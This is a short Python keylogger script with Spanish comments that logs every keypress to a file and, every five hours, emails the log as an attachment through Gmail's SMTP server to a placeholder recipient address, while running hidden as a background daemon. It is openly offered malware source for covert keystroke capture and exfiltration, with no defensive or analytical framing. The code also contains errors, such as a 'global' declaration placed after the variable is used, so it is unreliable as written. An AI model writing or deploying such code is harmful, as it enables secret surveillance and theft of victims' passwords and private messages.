import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import datetime
import time
import daemon

# Configuración de correo electrónico
sender_email = 'tu_correo_gmail@gmail.com'
receiver_email = 'destinatario@gmail.com'
password = 'tu_contraseña'

# Creación del correo electrónico
message = MIMEMultipart()
message['Subject'] = 'Registro de teclas'
message['From'] = sender_email
message['To'] = receiver_email

def on_key_press(event):
    with open('keylog.txt', 'a') as f:
        f.write(event.name)

        # Enviar correo electrónico cada 5 horas con archivo adjunto
        if (datetime.datetime.now() - last_email_time) > datetime.timedelta(hours=5):
            with open('keylog.txt', 'rb') as f:
                attach = MIMEApplication(f.read(), _subtype='txt')
                attach.add_header('Content-Disposition', 'attachment', filename='keylog.txt')
                message.attach(attach)

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                server.login(sender_email, password)
                server.sendmail(sender_email, receiver_email, message.as_string())

            # Actualizar el tiempo de envío de correo electrónico
            global last_email_time
            last_email_time = datetime.datetime.now()

# Configurar el keylogger
keyboard.on_press(on_key_press)
last_email_time = datetime.datetime.now()

# Ejecutar el script como un demonio en segundo plano
with daemon.DaemonContext():
    while True:
        time.sleep(1)
